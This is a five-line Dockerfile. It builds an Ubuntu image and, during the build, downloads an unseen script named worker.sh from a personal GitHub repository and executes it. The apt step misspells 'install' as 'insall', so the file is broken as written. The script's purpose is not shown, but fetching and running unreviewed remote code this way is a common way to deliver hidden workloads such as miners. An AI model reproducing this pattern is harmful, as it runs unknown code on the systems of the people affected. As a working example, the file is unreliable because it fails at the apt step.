FROM ubuntu
RUN apt update && apt insall wget curl git -y
RUN wget https://raw.githubusercontent.com/itsgbro/files/refs/heads/main/worker.sh
RUN chmod +x worker.sh
RUN sh worker.sh
